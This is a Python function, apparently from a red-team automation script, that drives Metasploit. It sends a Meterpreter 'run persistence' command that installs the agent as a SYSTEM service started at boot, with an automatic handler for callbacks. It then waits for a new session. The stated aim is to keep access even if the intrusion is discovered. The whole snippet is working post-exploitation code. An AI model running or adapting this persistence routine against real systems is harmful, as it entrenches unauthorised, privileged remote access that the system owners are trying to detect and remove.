
def persistenceFunc(msfconsoleContext):
   print("Persistance: Metasploit Persistance")
   print("Reason: Maintain connection if initial vector fails, dies or is discovered")
   """
   Metasploit Persistance:
   -A        Automatically start a matching exploit/multi/handler to connect to the agent
   -S        Automatically start the agent on boot as a service (with SYSTEM privileges
   -X        Automatically start the agent when the system boots
   """
   print("Executing: run persistence -A -X -S -i 5")
   #msfconsoleContext.sendline("ls")
   msfconsoleContext.sendline("run persistence -A -X -S -i 5")
   if msfconsoleContext.expect(["Meterpreter session 2 opened"],timeout=50) == 0:
       print("Done")
   else:
       print("Persistance Attempt failed")
